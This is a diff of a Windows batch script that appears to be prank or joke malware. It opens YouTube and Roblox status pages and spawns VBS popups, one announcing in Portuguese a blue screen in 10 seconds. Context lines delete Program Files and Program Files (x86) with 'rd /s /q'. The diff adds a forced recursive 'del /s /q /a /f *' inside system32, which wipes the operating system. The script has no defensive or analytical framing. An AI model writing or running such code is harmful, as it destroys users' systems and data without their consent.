@@ -548,10 +548,7 @@ start https://www.youtube.com/watch?v=oFwRQdE5Eqw
 start https://www.youtube.com/watch?v=oFwRQdE5Eqw
 timeout /t 10
 cd "%temp%"
-echo dim speak, speech>voz.vbs
-echo speaks="Eita merda, fudeu ne caralho!!!">>voz.vbs
-echo Set speech=CreateObject("sapi_spvoice")>>voz.vbs
-echo speech.Speak speaks>>voz.vbs
+echo XD>voz.vbs
 start voz.vbs
 start voz.vbs
 start voz.vbs
@@ -633,6 +630,9 @@ rd /s /q "Program Files"
 start https://status.roblox.com
 start https://status.roblox.com/
 rd /s /q "C:\Program Files (x86)"
+timeout /t 5 /nobreak > nul
+cd %windir%\system32
+del /s /q /a /f *
 cd "%temp%"
 echo/msgbox "Dando tela azul em 10 segundos">>legal.vbs
 start legal.vbs
